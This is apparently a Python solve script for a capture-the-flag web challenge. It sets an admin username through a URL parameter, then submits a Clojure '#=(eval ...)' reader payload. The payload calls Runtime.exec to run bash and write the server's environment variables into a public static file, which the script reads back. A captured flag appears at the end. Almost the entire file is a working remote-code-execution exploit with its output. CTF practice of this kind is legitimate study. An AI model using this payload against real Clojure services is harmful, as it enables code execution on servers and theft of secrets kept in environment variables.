import requests

with requests.session() as s:
    url = "https://a5f6bcb2307b2e9bcf64ffd9a382f720.chal.ctf.ae"
    s.get(url + "/?username=admin&redirect=/gists")
    s.post(url + "/gists", data={
        # "gist": '#=(* 7 7)'
        # "gist": '#=(eval "abc")'
        "gist": '#=(eval\
            (.\
                (java.lang.Runtime/getRuntime)\
                exec\
                (into-array ["bash" "-c" "export > ./resources/public/static/1.txt"])\
            )\
        )',  # https://b.poc.fun/faust-ctf-doedel-writeup/
    })
    resp = s.get(url + "/static/1.txt")
    print(resp.text)

# flag{jwHvR1Lv50TzsftMH8Bv9cJN7Jg6jbIC}
